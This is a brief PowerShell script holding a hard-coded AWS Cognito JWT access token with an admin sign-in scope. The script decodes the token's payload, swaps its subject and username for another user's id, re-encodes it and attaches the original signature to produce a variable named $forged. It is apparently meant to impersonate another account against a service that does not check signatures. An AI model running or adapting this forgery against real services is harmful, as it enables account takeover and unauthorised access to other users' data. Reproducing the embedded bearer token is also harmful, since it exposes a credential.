$originalToken = "eyJraWQiOiI1bk5mTE5tUXlPNmhWaStGbHBheEkyb09ldUxZMmR2c3h0cDR0OXo1MDFBPSIsImFsZyI6IlJTMjU2In0.eyJzdWIiOiIwMDhjNDlmYy1lMGUxLTcwNGQtOTRlZi04ZDJlODdjMzQxMDUiLCJpc3MiOiJodHRwczpcL1wvY29nbml0by1pZHAuZXUtbm9ydGgtMS5hbWF6b25hd3MuY29tXC9ldS1ub3J0aC0xX0RmMW1HczdOSyIsImNsaWVudF9pZCI6IjcyOG1iZ2RzbmxjZ2tlYXFrMTE4am1obGQ3Iiwib3JpZ2luX2p0aSI6IjE4OTM0ODczLThiMmYtNGQ0Yi1hN2ViLWFkNTIwNDE1NTNhZCIsImV2ZW50X2lkIjoiZDNiZDQ0MjMtMGZmMy00OGM1LWI1NDItMWQwMWJkNDFiMTk5IiwidG9rZW5fdXNlIjoiYWNjZXNzIiwic2NvcGUiOiJhd3MuY29nbml0by5zaWduaW4udXNlci5hZG1pbiIsImF1dGhfdGltZSI6MTc3Njg2NzQzNSwiZXhwIjoxNzc2OTMzNzM3LCJpYXQiOjE3NzY5MzAxMzcsImp0aSI6IjRmNDk4ZDc3LTRlNDMtNGYzOC05Mjc1LTgzNDY5YTI5NDJhZCIsInVzZXJuYW1lIjoiMDA4YzQ5ZmMtZTBlMS03MDRkLTk0ZWYtOGQyZTg3YzM0MTA1In0.iAEX6hu8gafhAcb-YXRurPg-FLW2x2CX1HgipDl7B47wIU1RHO5p7K4LOZ58MyJjWnIIyIiyBw550CtOi0DPm-eUUdHhWvTxjKE2oX5BZqdyL2VIP5vruPAcU5_QAkmqafONyTK67nW5B2NTUTnkrE5wfQxdE5glcCkrA3n6Heq9PLjfnOMdqWYCEPLN-UiNBasl_sMxr7Zl3PCqFtcojO5JQb7Bjjtd7GxyFdiO3IBJH0c_jwO52cwKb80abLftK5o6PDMGbAiTTR7-S6_G4YLCLzuJIsPtJcTiNopUmvyP4Egq0kHKAew3v2ykuGPgLUiFWMoE3bWNZNVOZixqeg"

$parts = $originalToken.Split('.')
$header = $parts[0]
$payload = $parts[1]
$signature = $parts[2]

# Convert base64url to standard base64
$payload = $payload.Replace('-', '+').Replace('_', '/')
# Add padding
switch ($payload.Length % 4) {
    2 { $payload += "==" }
    3 { $payload += "=" }
}

$json = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($payload))
$obj = $json | ConvertFrom-Json

$obj.sub = "902c395c-e0e1-7094-4b06-3d92b3d7900b"
$obj.username = "902c395c-e0e1-7094-4b06-3d92b3d7900b"

$newJson = ($obj | ConvertTo-Json -Compress)
$newPayload = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($newJson))
$newPayload = $newPayload.TrimEnd('=').Replace('+', '-').Replace('/', '_')
$forged = "$header.$newPayload.$signature"
$forged